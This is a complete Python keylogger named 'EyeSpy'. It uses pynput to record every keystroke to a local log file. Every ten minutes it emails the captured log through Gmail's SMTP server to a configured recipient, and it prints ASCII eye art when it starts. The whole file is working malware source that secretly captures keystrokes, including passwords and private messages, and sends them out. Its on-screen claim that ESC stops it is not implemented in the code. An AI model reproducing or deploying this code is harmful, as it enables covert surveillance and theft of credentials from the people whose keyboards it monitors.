from pynput import keyboard
import logging
import smtplib
import threading
from email.message import EmailMessage

def print_ascii_eye():
    eye_art = """
    
                          ▓▓████████████████                    
                    ▒▒██▓▓              ▒▒██████░░              
                ▓▓██░░    ▓▓██████████████    ██████            
            ██▒▒  ░░██████████████████████████    ██████        
          ██  ▒▒██░░  ████████████████████░░▒▒██▒▒  ▓▓████      
        ██  ██        ████████    ██████████    ████  ▒▒████░░  
      ▒▒            ████████        ████████      ████    ██████
    ░░░░            ██    ██        ████████        ████  ░░████
    ░░              ██    ██        ████████          ████    ██
                      ▒▒████████████████████          ██████    
                      ████████████████████          ░░██████    
      ░░                ████████████████          ░░██▒▒████    
          ░░              ▒▒████████▒▒          ████            
            ▒▒▒▒░░                          ▒▒██                
                  ░░▒▒██                ▓▓██  

    """
    print(eye_art)
log_file = "eyespy_keylog.txt"
email_address = "your_email@example.com"
email_password = "your_app_password"
recipient_email = "recipient_email@example.com"

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

def send_email():
    try:
        with open(log_file, "r") as file:
            content = file.read()
        if content.strip():
            msg = EmailMessage()
            msg.set_content(content)
            msg['Subject'] = 'EyeSpy Keylog Report'
            msg['From'] = email_address
            msg['To'] = recipient_email

            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(email_address, email_password)
                server.send_message(msg)

            print("[✅] Email sent successfully.")
            open(log_file, 'w').close()
    except Exception as e:
        print(f"[❌] Failed to send email: {e}")
    finally:
        threading.Timer(600, send_email).start()  # Schedule every 10 minutes

def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")


print_ascii_eye()
send_email()
with keyboard.Listener(on_press=on_press) as listener:
    print("🕵️ EyeSpy is running... Press ESC to stop.")
    listener.join()

print(f"Keylog saved to {log_file}")
